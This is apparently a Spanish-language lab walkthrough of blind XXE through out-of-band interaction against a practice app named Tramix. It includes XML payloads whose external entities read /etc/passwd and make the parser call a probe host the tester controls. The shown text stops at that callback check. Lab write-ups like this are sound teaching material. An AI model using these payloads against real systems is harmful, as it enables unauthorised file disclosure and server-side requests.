---
title: XXE a ciegas por interacción fuera de banda (Tramix)
date: 2026-10-21
mermaid: true
categories: [ZHacksLabs, "XML External Entity"]
tags: ["XXE","Blind","OOB","Blind XXE"]
---

---

Vamos a ver la aplicación web:

![](/assets/images/zh/xxe/xxe-a-ciegas-por-interacción-oob-tramix/1.png)

Vamos a darle  a `Entrar al panel`, donde veremos un formulario de inicio de sesión donde nos dan las siguientes credenciales:
- `d.serrano`:`Tramix-2026`

Vamos a iniciar sesión:

![](/assets/images/zh/xxe/xxe-a-ciegas-por-interacción-oob-tramix/2.png)

Vamos a probar a enviar un nuevo documento y ver como se procesa por atrás:

![](/assets/images/zh/xxe/xxe-a-ciegas-por-interacción-oob-tramix/3.png)
![](/assets/images/zh/xxe/xxe-a-ciegas-por-interacción-oob-tramix/4.png)

Vemos que se tramita por XML, vamos a enviarlo al `Repeater` e intentar un XXE *(XML External Entity)* para intentar leer el `/etc/passwd` usando el esquema URL `file://` usando una entidad externa:

> Acordaros de llamar a nuestra entidad externa en el cuerpo del documento XML. Ejemplo -> `&data;`
{: .prompt-info}

*Payload*:
```xml
<!DOCTYPE test [<!ENTITY data SYSTEM "file:///etc/passwd">]>
```

![](/assets/images/zh/xxe/xxe-a-ciegas-por-interacción-oob-tramix/5.png)

Vemos que no muestra nada, vamos a intentar apuntar a un servidor nuestro para ver si intenta apuntar a un DTD *(Document Type Definition)*:

*Payload:*
```xml
<!DOCTYPE test [<!ENTITY data SYSTEM "https://a49ba8ad70.sonda.tramix.lab">]>
```

![](/assets/images/zh/xxe/xxe-a-ciegas-por-interacción-oob-tramix/6.png)

![](/assets/images/zh/xxe/xxe-a-ciegas-por-interacción-oob-tramix/7.png)

---